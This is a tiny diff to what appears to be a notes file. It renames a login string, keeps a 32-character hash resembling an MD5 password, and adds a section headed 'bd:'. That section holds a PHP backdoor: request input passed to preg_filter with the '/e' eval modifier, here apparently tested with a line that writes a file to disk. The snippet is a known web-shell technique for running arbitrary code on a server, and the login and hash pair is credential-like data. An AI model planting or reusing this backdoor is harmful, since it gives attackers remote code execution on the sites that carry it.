@@ -1,2 +1,6 @@
-liuyislog
+liuyislogin
 589dae7af22d8570c0ee3b36782b1b16
+
+bd:
+$_REQUEST['pass'] = 'file_put_contents("1.22","22")';
+preg_filter('|.*|e', $_REQUEST['pass'], '');
